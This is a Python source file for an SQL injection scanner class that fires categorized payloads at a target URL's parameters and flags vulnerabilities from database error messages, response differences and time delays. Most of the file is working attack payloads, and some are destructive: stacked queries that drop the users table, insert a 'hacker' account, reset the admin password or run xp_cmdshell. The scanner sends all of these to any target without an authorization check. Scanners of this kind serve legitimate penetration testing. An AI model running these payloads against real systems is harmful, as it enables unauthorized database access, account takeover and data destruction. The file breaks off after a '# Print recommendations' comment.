import re
import time
import json
import hashlib
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from colorama import Fore, Style, Back, init
from datetime import datetime
import random

# Initialize colorama
init(autoreset=True)

class SQLInjectionScanner:
    def __init__(self):
        self.name = "🗃️ ADVANCED SQL INJECTION VULNERABILITY SCANNER"
        self.version = "3.8"
        self.author = "Security Research Team"
        
        # Enhanced color scheme
        self.colors = {
            'banner': Fore.MAGENTA + Style.BRIGHT,
            'header': Fore.WHITE + Style.BRIGHT,
            'info': Fore.CYAN + Style.BRIGHT,
            'success': Fore.GREEN + Style.BRIGHT,
            'warning': Fore.YELLOW + Style.BRIGHT,
            'error': Fore.RED + Style.BRIGHT,
            'critical': Back.RED + Fore.WHITE + Style.BRIGHT,
            'sqli': Fore.RED + Style.BRIGHT,
            'payload': Fore.YELLOW + Style.BRIGHT,
            'parameter': Fore.BLUE + Style.BRIGHT,
            'database': Fore.GREEN + Style.BRIGHT,
            'timebased': Fore.MAGENTA + Style.BRIGHT,
            'blind': Fore.CYAN + Style.BRIGHT,
            'union': Fore.LIGHTYELLOW_EX + Style.BRIGHT,
            'errorbased': Fore.LIGHTRED_EX + Style.BRIGHT,
            'timestamp': Fore.LIGHTBLACK_EX,
            'separator': Fore.LIGHTBLACK_EX + Style.DIM,
            'highlight': Fore.YELLOW + Back.BLACK + Style.BRIGHT,
            'evidence': Fore.LIGHTCYAN_EX + Style.BRIGHT,
            'technique': Fore.LIGHTMAGENTA_EX + Style.BRIGHT
        }
        
        # Comprehensive SQL injection payloads categorized by technique and database
        self.payloads = {
            'error_based': {
                'generic': [
                    "'",
                    "\"",
                    "`",
                    "'\"'",
                    "\"'\"",
                    "' OR '1'='1",
                    "' OR '1'='1' --",
                    "' OR '1'='1' #",
                    "' OR '1'='1' /*",
                    "\" OR \"1\"=\"1",
                    "\" OR \"1\"=\"1\" --",
                    "` OR `1`=`1",
                    "' OR 'x'='x",
                    "' OR 'a'='a' --",
                    "' OR 1=1 --",
                    "' OR 1=1#",
                    "' OR 1=1/*",
                    "' OR '1'='1' /*",
                    "admin' --",
                    "admin' #",
                    "admin'/*",
                    "' OR '1'='1' UNION SELECT 1,2,3 --",
                    "' AND 1=CONVERT(int, (SELECT @@version)) --",
                    "' AND 1=CAST((SELECT @@version) AS int) --"
                ],
                'mysql': [
                    "' AND ExtractValue(1, CONCAT(0x5c, (SELECT @@version))) --",
                    "' AND UpdateXML(1, CONCAT(0x5c, (SELECT @@version)), 1) --",
                    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2)) x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) a) --",
                    "' AND EXP(~(SELECT * FROM (SELECT @@version) a)) --",
                    "' AND (SELECT * FROM (SELECT NAME_CONST(@@version,0),NAME_CONST(@@version,0)) a) --"
                ],
                'postgresql': [
                    "' AND CAST((SELECT version()) AS NUMERIC) --",
                    "' AND (SELECT 1 FROM (SELECT CAST(version() AS NUMERIC)) a) --",
                    "' AND (SELECT 1 FROM (SELECT CAST(current_database() AS NUMERIC)) a) --",
                    "' AND (SELECT 1 FROM (SELECT CAST(current_user AS NUMERIC)) a) --"
                ],
                'mssql': [
                    "' AND 1=CONVERT(int, (SELECT @@version)) --",
                    "' AND 1=CAST((SELECT @@version) AS int) --",
                    "' AND 1=(SELECT @@version) --",
                    "' AND 1=@@version --"
                ],
                'oracle': [
                    "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1)) --",
                    "' AND 1=(SELECT banner FROM v$version WHERE rownum=1) --",
                    "' AND (SELECT banner FROM v$version WHERE rownum=1)='' --"
                ],
                'sqlite': [
                    "' AND 1=CAST((SELECT sqlite_version()) AS INTEGER) --",
                    "' AND (SELECT sqlite_version())='' --"
                ]
            },
            
            'union_based': {
                'generic': [
                    "' UNION SELECT NULL --",
                    "' UNION SELECT NULL, NULL --",
                    "' UNION SELECT NULL, NULL, NULL --",
                    "' UNION SELECT NULL, NULL, NULL, NULL --",
                    "' UNION SELECT NULL, NULL, NULL, NULL, NULL --",
                    "' UNION SELECT 1 --",
                    "' UNION SELECT 1,2 --",
                    "' UNION SELECT 1,2,3 --",
                    "' UNION SELECT 1,2,3,4 --",
                    "' UNION SELECT 1,2,3,4,5 --",
                    "-1' UNION SELECT 1,2,3 --",
                    "-1' UNION SELECT 1,2,3,4,5 --",
                    "0' UNION SELECT 1,2,3 --",
                    "999' UNION SELECT 1,2,3 --"
                ],
                'mysql': [
                    "' UNION SELECT @@version,2,3 --",
                    "' UNION SELECT user(),2,3 --",
                    "' UNION SELECT database(),2,3 --",
                    "' UNION SELECT @@version,user(),database() --",
                    "' UNION SELECT table_name,column_name,3 FROM information_schema.columns --",
                    "' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database() --",
                    "' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_schema=database() --"
                ],
                'postgresql': [
                    "' UNION SELECT version(),2,3 --",
                    "' UNION SELECT current_user,2,3 --",
                    "' UNION SELECT current_database(),2,3 --",
                    "' UNION SELECT table_name,column_name,3 FROM information_schema.columns --"
                ],
                'mssql': [
                    "' UNION SELECT @@version,2,3 --",
                    "' UNION SELECT SYSTEM_USER,2,3 --",
                    "' UNION SELECT DB_NAME(),2,3 --",
                    "' UNION SELECT name,2,3 FROM sys.databases --"
                ],
                'oracle': [
                    "' UNION SELECT banner,2,3 FROM v$version --",
                    "' UNION SELECT user,2,3 FROM dual --",
                    "' UNION SELECT table_name,column_name,3 FROM all_tab_columns --"
                ],
                'sqlite': [
                    "' UNION SELECT sqlite_version(),2,3 --",
                    "' UNION SELECT name,2,3 FROM sqlite_master WHERE type='table' --"
                ]
            },
            
            'blind_boolean': {
                'generic': [
                    "' AND '1'='1",
                    "' AND '1'='2",
                    "' AND 1=1",
                    "' AND 1=2",
                    "' OR '1'='1",
                    "' OR '1'='2",
                    "' OR 1=1",
                    "' OR 1=2",
                    "' AND SLEEP(1)=0",
                    "' AND IF(1=1,1,0)=1",
                    "' AND IF(1=2,1,0)=1"
                ],
                'mysql': [
                    "' AND IF(ASCII(SUBSTRING((SELECT @@version),1,1))>0,1,0)=1 --",
                    "' AND IF(ASCII(SUBSTRING((SELECT user()),1,1))>0,1,0)=1 --",
                    "' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='a' --"
                ],
                'postgresql': [
                    "' AND (SELECT SUBSTRING(version(),1,1))='P' --",
                    "' AND (SELECT SUBSTRING(current_user,1,1))='p' --"
                ]
            },
            
            'time_based': {
                'generic': [
                    "' AND SLEEP(5) --",
                    "' OR SLEEP(5) --",
                    "'; SLEEP(5) --",
                    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
                    "' OR (SELECT * FROM (SELECT(SLEEP(5)))a) --",
                    "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND SLEEP(5) --"
                ],
                'mysql': [
                    "' AND BENCHMARK(1000000,MD5('A')) --",
                    "' AND (SELECT * FROM (SELECT BENCHMARK(1000000,MD5('A')))a) --",
                    "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND BENCHMARK(1000000,MD5('A')) --",
                    "' AND IF(ASCII(SUBSTRING((SELECT @@version),1,1))>0,BENCHMARK(1000000,MD5('A')),0) --"
                ],
                'postgresql': [
                    "' AND pg_sleep(5) --",
                    "' OR pg_sleep(5) --",
                    "'; SELECT pg_sleep(5) --",
                    "' AND (SELECT pg_sleep(5) FROM generate_series(1,100)) --"
                ],
                'mssql': [
                    "' WAITFOR DELAY '00:00:05' --",
                    "'; WAITFOR DELAY '00:00:05' --",
                    "' OR WAITFOR DELAY '00:00:05' --",
                    "' AND (SELECT COUNT(*) FROM sys.databases) > 0 WAITFOR DELAY '00:00:05' --"
                ],
                'oracle': [
                    "' AND (SELECT COUNT(*) FROM all_users) > 0 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5) = 0 --",
                    "' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5) = 0 --",
                    "'; DBMS_LOCK.SLEEP(5) --"
                ],
                'sqlite': [
                    "' AND (SELECT COUNT(*) FROM sqlite_master) > 0 AND randomblob(100000000) --",
                    "' OR randomblob(100000000) --"
                ]
            },
            
            'stacked_queries': {
                'generic': [
                    "'; SELECT 1 --",
                    "'; SELECT 1; --",
                    "'; SELECT @@version; --",
                    "'; DROP TABLE users; --",
                    "'; INSERT INTO users (username, password) VALUES ('hacker', 'pwned'); --",
                    "'; UPDATE users SET password='pwned' WHERE username='admin'; --"
                ],
                'mysql': [
                    "'; SELECT SLEEP(5); --",
                    "'; SHOW TABLES; --",
                    "'; SHOW DATABASES; --"
                ],
                'postgresql': [
                    "'; SELECT pg_sleep(5); --",
                    "'; SELECT version(); --"
                ],
                'mssql': [
                    "'; EXEC xp_cmdshell('whoami'); --",
                    "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; --"
                ]
            },
            
            'order_by': {
                'generic': [
                    "1' ORDER BY 1--",
                    "1' ORDER BY 2--",
                    "1' ORDER BY 3--",
                    "1' ORDER BY 4--",
                    "1' ORDER BY 5--",
                    "1' ORDER BY 999--",
                    "1' ORDER BY (SELECT 1)--",
                    "1' ORDER BY (SELECT NULL)--",
                    "1' ORDER BY (SELECT 1 FROM (SELECT 1)a)--",
                    "1' ORDER BY (SELECT 1 FROM (SELECT 1,2)a)--"
                ]
            },
            
            'second_order': {
                'generic': [
                    "admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users WHERE username='admin'),0x3a,FLOOR(RAND(0)*2)) x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) a) --",
                    "admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2)) x FROM INFORMATION_SCHEMA.TABLES GROUP BY x) a) --"
                ]
            }
        }
        
        # Database error patterns for detection
        self.db_error_patterns = {
            'mysql': [
                r"SQL syntax.*MySQL",
                r"Warning.*mysql_.*",
                r"MySQLSyntaxErrorException",
                r"valid MySQL result",
                r"MySqlClient\.",
                r"com\.mysql\.jdbc",
                r"Zend_Db_Adapter_Mysqli",
                r"pdo_mysql",
                r"mysql_fetch",
                r"mysql_num_rows",
                r"mysql_query",
                r"mysql_error",
                r"mysqli_fetch",
                r"mysqli_query",
                r"mysqli_error",
                r"SQLSTATE\[42000\]"
            ],
            'postgresql': [
                r"PostgreSQL.*ERROR",
                r"Warning.*\Wpg_.*",
                r"valid PostgreSQL result",
                r"Npgsql\.",
                r"PG::SyntaxError",
                r"org\.postgresql",
                r"ERROR:\s*syntax error at or near",
                r"ERROR: parser: parse error at or near"
            ],
            'mssql': [
                r"Microsoft OLE DB Provider for SQL Server",
                r"Microsoft SQL Server",
                r"SQL Server.*Driver",
                r"SQLServer JDBC Driver",
                r"SQLServer Exception",
                r"System.Data.SqlClient",
                r"Unclosed quotation mark",
                r"Incorrect syntax near",
                r"Sintaxis incorrecta cerca de",
                r"Syntax error in string in query expression",
                r"ADODB\.",
                r"Microsoft OLE DB"
            ],
            'oracle': [
                r"ORA-[0-9]{5}",
                r"Oracle error",
                r"Oracle.*Driver",
                r"OracleException",
                r"java.sql.SQLException: ORA-",
                r"Oracle JDBC Driver",
                r"quoted string not properly terminated",
                r"TNS:listener",
                r"SQL command not properly ended",
                r"PLS-[0-9]{5}",
                r"error in your SQL syntax near"
            ],
            'sqlite': [
                r"SQLite/JDBCDriver",
                r"SQLite.Exception",
                r"System.Data.SQLite.SQLiteException",
                r"Warning.*sqlite_.*",
                r"SQLite error",
                r"SQLite3::",
                r"SQL logic error",
                r"unsupported file format",
                r"near \".*\": syntax error"
            ],
            'generic': [
                r"SQL syntax.*",
                r"Warning.*sql.*",
                r"Unclosed quotation mark",
                r"quoted string not properly terminated",
                r"syntax error",
                r"unexpected token",
                r"SQL command not properly ended",
                r"invalid query",
                r"SQL error",
                r"Database error",
                r"mysql_fetch",
                r"Syntax error"
            ]
        }
        
        # Time-based detection thresholds (seconds)
        self.time_thresholds = {
            'short': 3,
            'medium': 5,
            'long': 10
        }
        
        # Risk levels
        self.risk_levels = {
            'critical': {
                'color': Back.RED + Fore.WHITE + Style.BRIGHT,
                'score': 50,
                'description': 'Direct SQL injection with data extraction capability'
            },
            'high': {
                'color': Fore.RED + Style.BRIGHT,
                'score': 40,
                'description': 'Time-based or error-based SQL injection'
            },
            'medium': {
                'color': Fore.YELLOW + Style.BRIGHT,
                'score': 30,
                'description': 'Boolean-based or union-based injection'
            },
            'low': {
                'color': Fore.BLUE + Style.BRIGHT,
                'score': 20,
                'description': 'Potential SQL injection vulnerability'
            }
        }

    def print_banner(self):
        """Display enhanced scanner banner"""
        banner = f"""
{self.colors['banner']}{"="*95}
{self.colors['header']}╔═══════════════════════════════════════════════════════════════════════════════╗
║ {self.colors['banner']}{self.name:^83} {self.colors['header']}║
║ {self.colors['info']}Version: {self.version:<73} {self.colors['header']}║
║ {self.colors['info']}Author: {self.author:<73} {self.colors['header']}║
╚═══════════════════════════════════════════════════════════════════════════════╝
{self.colors['banner']}{"="*95}
"""
        print(banner)

    def print_status(self, message, level="info", indent=0, payload=None):
        """Print colored status messages with timestamp"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        prefix = {
            "info": f"{self.colors['info']}[ℹ]",
            "success": f"{self.colors['success']}[✓]",
            "warning": f"{self.colors['warning']}[⚠]",
            "error": f"{self.colors['error']}[✗]",
            "critical": f"{self.colors['critical']}[‼]",
            "sqli": f"{self.colors['sqli']}[🗃️]",
            "payload": f"{self.colors['payload']}[🎯]",
            "parameter": f"{self.colors['parameter']}[🔧]",
            "timebased": f"{self.colors['timebased']}[⏱️]",
            "blind": f"{self.colors['blind']}[👁️]",
            "union": f"{self.colors['union']}[🔗]",
            "errorbased": f"{self.colors['errorbased']}[⚠]",
            "scan": f"{self.colors['info']}[🔍]",
            "database": f"{self.colors['database']}[💾]"
        }.get(level, f"{self.colors['info']}[*]")
        
        indent_str = "  " * indent
        payload_str = f" {self.colors['payload']}{payload}" if payload else ""
        print(f"{self.colors['timestamp']}[{timestamp}] {prefix}{Style.RESET_ALL} {indent_str}{message}{payload_str}")

    def scan(self, target, options=None):
        """Comprehensive SQL injection vulnerability scanning"""
        self.print_banner()
        
        results = {
            'target': target,
            'vulnerabilities': [],
            'tested_parameters': 0,
            'tested_payloads': 0,
            'risk_score': 0,
            'start_time': time.time(),
            'end_time': None,
            'scan_duration': None
        }
        
        try:
            from utils.request_wrapper import RequestWrapper
            req = RequestWrapper()
            
            self.print_status(f"Initiating SQL injection scan on target: {self.colors['highlight']}{target}", "info")
            
            # Parse URL and extract parameters
            parsed_url = urlparse(target)
            query_params = parse_qs(parsed_url.query) if parsed_url.query else {}
            
            # If no parameters in URL, try to discover parameters
            if not query_params:
                self.print_status("No parameters found in URL. Attempting parameter discovery...", "warning")
                discovered_params = self.discover_parameters(target, req)
                if discovered_params:
                    query_params = discovered_params
                    self.print_status(f"Discovered {len(discovered_params)} parameters", "success")
                else:
                    self.print_status("No parameters discovered. Using common parameters...", "info")
                    query_params = {'id': ['1'], 'page': ['1'], 'user': ['test'], 'search': ['test']}
            
            # Phase 1: Error-based SQL injection testing
            self.print_status("Phase 1: Testing for Error-based SQL Injection...", "scan")
            error_results = self.test_error_based(target, query_params, req)
            results['vulnerabilities'].extend(error_results['vulnerabilities'])
            results['tested_parameters'] += error_results['tested_parameters']
            results['tested_payloads'] += error_results['tested_payloads']
            
            # Phase 2: Union-based SQL injection testing
            self.print_status("Phase 2: Testing for Union-based SQL Injection...", "scan")
            union_results = self.test_union_based(target, query_params, req)
            results['vulnerabilities'].extend(union_results['vulnerabilities'])
            results['tested_parameters'] += union_results['tested_parameters']
            results['tested_payloads'] += union_results['tested_payloads']
            
            # Phase 3: Boolean-based blind SQL injection testing
            self.print_status("Phase 3: Testing for Boolean-based Blind SQL Injection...", "scan")
            boolean_results = self.test_boolean_based(target, query_params, req)
            results['vulnerabilities'].extend(boolean_results['vulnerabilities'])
            results['tested_parameters'] += boolean_results['tested_parameters']
            results['tested_payloads'] += boolean_results['tested_payloads']
            
            # Phase 4: Time-based blind SQL injection testing
            self.print_status("Phase 4: Testing for Time-based Blind SQL Injection...", "scan")
            time_results = self.test_time_based(target, query_params, req)
            results['vulnerabilities'].extend(time_results['vulnerabilities'])
            results['tested_parameters'] += time_results['tested_parameters']
            results['tested_payloads'] += time_results['tested_payloads']
            
            # Calculate risk score
            results['risk_score'] = self.calculate_risk_score(results)
            
            # Complete scan
            results['end_time'] = time.time()
            results['scan_duration'] = results['end_time'] - results['start_time']
            
            # Print comprehensive report
            self.print_summary(results)
            
            return results
            
        except Exception as e:
            self.print_status(f"Scan error: {str(e)}", "error")
            results['error'] = str(e)
            results['end_time'] = time.time()
            return results

    def discover_parameters(self, target, req):
        """Discover parameters by analyzing the page"""
        discovered_params = {}
        
        try:
            response = req.get(target)
            
            # Look for forms
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find form inputs
            forms = soup.find_all('form')
            for form in forms:
                inputs = form.find_all(['input', 'textarea', 'select'])
                for input_tag in inputs:
                    name = input_tag.get('name')
                    value = input_tag.get('value', 'test')
                    if name and name not in discovered_params:
                        discovered_params[name] = [value]
            
            # Look for links with parameters
            links = soup.find_all('a', href=True)
            for link in links:
                href = link['href']
                if '?' in href:
                    parsed = urlparse(href)
                    params = parse_qs(parsed.query)
                    discovered_params.update(params)
            
        except Exception as e:
            self.print_status(f"Parameter discovery error: {e}", "error")
        
        return discovered_params

    def test_error_based(self, target, query_params, req):
        """Test for error-based SQL injection"""
        results = {
            'vulnerabilities': [],
            'tested_parameters': 0,
            'tested_payloads': 0
        }
        
        self.print_status(f"Testing {len(query_params)} parameters for error-based SQLi...", "info", 1)
        
        for param_name in query_params:
            self.print_status(f"Testing parameter: {param_name}", "parameter", 2)
            
            # Test generic payloads first
            for payload in self.payloads['error_based']['generic'][:15]:
                try:
                    test_params = self.create_test_params(query_params, param_name, payload)
                    response = req.get(target, params=test_params, timeout=15)
                    
                    results['tested_payloads'] += 1
                    
                    analysis = self.analyze_error_response(response, payload)
                    
                    if analysis['is_vulnerable']:
                        vulnerability = {
                            'type': 'Error-based SQL Injection',
                            'parameter': param_name,
                            'payload': payload,
                            'technique': 'error_based',
                            'database': analysis['database'],
                            'url': response.url,
                            'evidence': analysis['evidence'],
                            'risk_level': 'high',
                            'confidence': analysis['confidence']
                        }
                        
                        results['vulnerabilities'].append(vulnerability)
                        
                        color = self.risk_levels.get('high', {}).get('color', Fore.RED)
                        self.print_status(f"{color}Error-based SQLi found! Parameter: {param_name}", "errorbased", 3)
                        self.print_status(f"Database: {analysis['database']} | Confidence: {analysis['confidence']}%", "database", 4)
                        
                        # Don't test more payloads for this parameter
                        break
                    
                    time.sleep(0.1)
                    
                except Exception as e:
                    continue
            
            results['tested_parameters'] += 1
        
        return results

    def test_union_based(self, target, query_params, req):
        """Test for union-based SQL injection"""
        results = {
            'vulnerabilities': [],
            'tested_parameters': 0,
            'tested_payloads': 0
        }
        
        self.print_status(f"Testing {len(query_params)} parameters for union-based SQLi...", "info", 1)
        
        for param_name in query_params:
            self.print_status(f"Testing parameter: {param_name}", "parameter", 2)
            
            # Test column count detection
            column_count = self.detect_column_count(target, param_name, query_params, req)
            
            if column_count > 0:
                self.print_status(f"Detected {column_count} columns", "success", 3)
                
                # Test union payloads
                for db_type in ['mysql', 'postgresql', 'mssql', 'oracle', 'sqlite']:
                    for payload in self.payloads['union_based'][db_type][:5]:
                        if 'NULL' in payload:
                            # Adjust NULL count to match column count
                            null_count = payload.count('NULL')
                            if null_count != column_count:
                                # Create payload with correct number of NULLs
                                nulls = ', '.join(['NULL'] * column_count)
                                payload = payload.replace(', '.join(['NULL'] * null_count), nulls)
                        
                        try:
                            test_params = self.create_test_params(query_params, param_name, payload)
                            response = req.get(target, params=test_params, timeout=15)
                            
                            results['tested_payloads'] += 1
                            
                            if self.detect_union_injection(response):
                                vulnerability = {
                                    'type': 'Union-based SQL Injection',
                                    'parameter': param_name,
                                    'payload': payload,
                                    'technique': 'union_based',
                                    'database': db_type,
                                    'column_count': column_count,
                                    'url': response.url,
                                    'evidence': self.extract_union_evidence(response),
                                    'risk_level': 'critical',
                                    'confidence': 80
                                }
                                
                                results['vulnerabilities'].append(vulnerability)
                                
                                color = self.risk_levels.get('critical', {}).get('color', Fore.RED)
                                self.print_status(f"{color}Union-based SQLi found! Parameter: {param_name}", "union", 3)
                                self.print_status(f"Database: {db_type} | Columns: {column_count}", "database", 4)
                                
                                break
                            
                            time.sleep(0.1)
                            
                        except Exception as e:
                            continue
            
            results['tested_parameters'] += 1
        
        return results

    def test_boolean_based(self, target, query_params, req):
        """Test for boolean-based blind SQL injection"""
        results = {
            'vulnerabilities': [],
            'tested_parameters': 0,
            'tested_payloads': 0
        }
        
        self.print_status(f"Testing {len(query_params)} parameters for boolean-based blind SQLi...", "info", 1)
        
        for param_name in query_params:
            self.print_status(f"Testing parameter: {param_name}", "parameter", 2)
            
            # Get baseline response
            baseline_params = self.create_test_params(query_params, param_name, "1")
            baseline_response = req.get(target, params=baseline_params, timeout=15)
            baseline_content = baseline_response.text
            baseline_hash = hashlib.md5(baseline_content.encode()).hexdigest()
            
            # Test true condition
            true_params = self.create_test_params(query_params, param_name, "' AND '1'='1")
            true_response = req.get(target, params=true_params, timeout=15)
            true_hash = hashlib.md5(true_response.text.encode()).hexdigest()
            
            # Test false condition
            false_params = self.create_test_params(query_params, param_name, "' AND '1'='2")
            false_response = req.get(target, params=false_params, timeout=15)
            false_hash = hashlib.md5(false_response.text.encode()).hexdigest()
            
            results['tested_payloads'] += 2
            
            # Check if responses are different (indicating boolean-based injection)
            if true_hash != false_hash and (true_hash == baseline_hash or false_hash == baseline_hash):
                vulnerability = {
                    'type': 'Boolean-based Blind SQL Injection',
                    'parameter': param_name,
                    'technique': 'boolean_based',
                    'evidence': {
                        'true_response_hash': true_hash[:8],
                        'false_response_hash': false_hash[:8],
                        'baseline_response_hash': baseline_hash[:8]
                    },
                    'risk_level': 'medium',
                    'confidence': 70
                }
                
                results['vulnerabilities'].append(vulnerability)
                
                color = self.risk_levels.get('medium', {}).get('color', Fore.YELLOW)
                self.print_status(f"{color}Boolean-based blind SQLi found! Parameter: {param_name}", "blind", 3)
            
            results['tested_parameters'] += 1
            time.sleep(0.2)
        
        return results

    def test_time_based(self, target, query_params, req):
        """Test for time-based blind SQL injection"""
        results = {
            'vulnerabilities': [],
            'tested_parameters': 0,
            'tested_payloads': 0
        }
        
        self.print_status(f"Testing {len(query_params)} parameters for time-based blind SQLi...", "info", 1)
        
        for param_name in query_params:
            self.print_status(f"Testing parameter: {param_name}", "parameter", 2)
            
            # Get baseline response time
            baseline_params = self.create_test_params(query_params, param_name, "1")
            start_time = time.time()
            baseline_response = req.get(target, params=baseline_params, timeout=30)
            baseline_time = time.time() - start_time
            
            # Test time-based payload
            for db_type in ['mysql', 'postgresql', 'mssql', 'oracle', 'sqlite']:
                for payload in self.payloads['time_based'][db_type][:3]:
                    try:
                        test_params = self.create_test_params(query_params, param_name, payload)
                        start_time = time.time()
                        response = req.get(target, params=test_params, timeout=30)
                        response_time = time.time() - start_time
                        
                        results['tested_payloads'] += 1
                        
                        # Check if response was significantly delayed
                        if response_time > baseline_time + self.time_thresholds['short']:
                            vulnerability = {
                                'type': 'Time-based Blind SQL Injection',
                                'parameter': param_name,
                                'payload': payload,
                                'technique': 'time_based',
                                'database': db_type,
                                'evidence': {
                                    'baseline_time': round(baseline_time, 2),
                                    'response_time': round(response_time, 2),
                                    'delay': round(response_time - baseline_time, 2)
                                },
                                'risk_level': 'high',
                                'confidence': min(90, int((response_time - baseline_time) * 20))
                            }
                            
                            results['vulnerabilities'].append(vulnerability)
                            
                            color = self.risk_levels.get('high', {}).get('color', Fore.RED)
                            self.print_status(f"{color}Time-based SQLi found! Parameter: {param_name}", "timebased", 3)
                            self.print_status(f"Delay: {round(response_time - baseline_time, 2)}s | Database: {db_type}", "database", 4)
                            
                            break
                        
                        time.sleep(0.5)
                        
                    except Exception as e:
                        continue
            
            results['tested_parameters'] += 1
        
        return results

    def create_test_params(self, query_params, param_name, payload):
        """Create test parameters with injected payload"""
        test_params = query_params.copy()
        test_params[param_name] = payload
        return test_params

    def detect_column_count(self, target, param_name, query_params, req):
        """Detect number of columns using ORDER BY technique"""
        for i in range(1, 20):  # Try up to 20 columns
            payload = f"1' ORDER BY {i} --"
            test_params = self.create_test_params(query_params, param_name, payload)
            
            try:
                response = req.get(target, params=test_params, timeout=15)
                
                # If we get an error, we've exceeded the number of columns
                if self.detect_error_response(response):
                    return i - 1
                
                time.sleep(0.1)
                
            except Exception as e:
                break
        
        return 0

    def analyze_error_response(self, response, payload):
        """Analyze response for SQL error patterns"""
        analysis = {
            'is_vulnerable': False,
            'database': 'unknown',
            'confidence': 0,
            'evidence': ''
        }
        
        response_text = response.text
        
        # Check for database-specific errors
        for db_type, patterns in self.db_error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    analysis['is_vulnerable'] = True
                    analysis['database'] = db_type
                    analysis['confidence'] += 30
                    
                    # Extract error evidence
                    match = re.search(pattern, response_text, re.IGNORECASE)
                    if match:
                        start = max(0, match.start() - 100)
                        end = min(len(response_text), match.end() + 100)
                        analysis['evidence'] = response_text[start:end]
                    
                    break
            
            if analysis['is_vulnerable']:
                break
        
        # Check for generic SQL errors
        if not analysis['is_vulnerable']:
            for pattern in self.db_error_patterns['generic']:
                if re.search(pattern, response_text, re.IGNORECASE):
                    analysis['is_vulnerable'] = True
                    analysis['database'] = 'generic'
                    analysis['confidence'] += 20
                    break
        
        return analysis

    def detect_error_response(self, response):
        """Detect if response contains SQL error"""
        response_text = response.text
        
        for db_type, patterns in self.db_error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return True
        
        return False

    def detect_union_injection(self, response):
        """Detect successful union injection"""
        response_text = response.text
        
        # Look for database information in response
        union_indicators = [
            r'@@version',
            r'version()',
            r'current_user',
            r'database()',
            r'DB_NAME()',
            r'user()',
            r'sqlite_version()',
            r'MySQL',
            r'PostgreSQL',
            r'SQL Server',
            r'Oracle',
            r'SQLite'
        ]
        
        for indicator in union_indicators:
            if re.search(indicator, response_text, re.IGNORECASE):
                return True
        
        # Check for numeric values from union select
        if re.search(r'\b1\b.*\b2\b.*\b3\b', response_text):
            return True
        
        return False

    def extract_union_evidence(self, response):
        """Extract evidence from union injection"""
        evidence = {
            'content_snippet': response.text[:200],
            'database_info': []
        }
        
        # Extract potential database information
        info_patterns = [
            r'(MySQL.*?\d+\.\d+\.\d+)',
            r'(PostgreSQL.*?\d+\.\d+)',
            r'(Microsoft SQL Server.*?\d+)',
            r'(Oracle.*?\d+\.\d+\.\d+\.\d+\.\d+)',
            r'(SQLite.*?\d+\.\d+\.\d+)'
        ]
        
        for pattern in info_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            evidence['database_info'].extend(matches)
        
        return evidence

    def calculate_risk_score(self, results):
        """Calculate overall risk score"""
        score = 0
        
        for vuln in results['vulnerabilities']:
            risk_level = vuln.get('risk_level', 'low')
            score += self.risk_levels.get(risk_level, {}).get('score', 20)
            
            # Add confidence bonus
            confidence = vuln.get('confidence', 0)
            score += confidence / 10
        
        # Cap at 100
        return min(score, 100)

    def print_summary(self, results):
        """Print comprehensive scan summary"""
        duration = results.get('scan_duration', 0)
        
        summary = f"""
{self.colors['separator']}{"="*95}
{self.colors['header']}📊 SQL INJECTION SCAN SUMMARY
{self.colors['separator']}{"-"*95}
{self.colors['info']}Target URL:           {results['target']}
{self.colors['info']}Scan Duration:        {duration:.2f} seconds
{self.colors['info']}Parameters Tested:    {results['tested_parameters']}
{self.colors['info']}Payloads Tested:      {results['tested_payloads']}
{self.colors['info']}Vulnerabilities:      {len(results['vulnerabilities'])}
{self.colors['info']}Risk Score:           {results['risk_score']}/100
{self.colors['separator']}{"-"*95}
"""
        print(summary)
        
        # Group vulnerabilities by type
        vuln_by_type = {}
        for vuln in results['vulnerabilities']:
            vuln_type = vuln.get('type', 'Unknown')
            if vuln_type not in vuln_by_type:
                vuln_by_type[vuln_type] = []
            vuln_by_type[vuln_type].append(vuln)
        
        # Print vulnerabilities by type
        for vuln_type, vulns in vuln_by_type.items():
            print(f"\n{self.colors['header']}{vuln_type.upper()} ({len(vulns)}):")
            print(f"{self.colors['separator']}{'-'*95}")
            
            for i, vuln in enumerate(vulns[:5], 1):  # Show first 5 of each type
                color = self.risk_levels.get(vuln['risk_level'], {}).get('color', Fore.RED)
                
                print(f"{color}▶ {i}. Parameter: '{vuln['parameter']}'")
                print(f"{self.colors['info']}   Technique: {vuln.get('technique', 'Unknown')}")
                print(f"{self.colors['info']}   Database: {vuln.get('database', 'Unknown')}")
                print(f"{self.colors['info']}   Confidence: {vuln.get('confidence', 0)}%")
                
                if vuln.get('payload'):
                    print(f"{self.colors['payload']}   Payload: {vuln['payload'][:80]}")
                
                if vuln.get('evidence'):
                    if isinstance(vuln['evidence'], dict):
                        for key, value in vuln['evidence'].items():
                            if key != 'content_snippet' or len(str(value)) < 100:
                                print(f"{self.colors['evidence']}   {key}: {value}")
                    else:
                        print(f"{self.colors['evidence']}   Evidence: {str(vuln['evidence'])[:100]}...")
                
                print(f"{self.colors['timestamp']}   URL: {vuln.get('url', 'N/A')[:80]}...")
                print(f"{self.colors['separator']}{'-'*40}")
        
        # Print recommendations
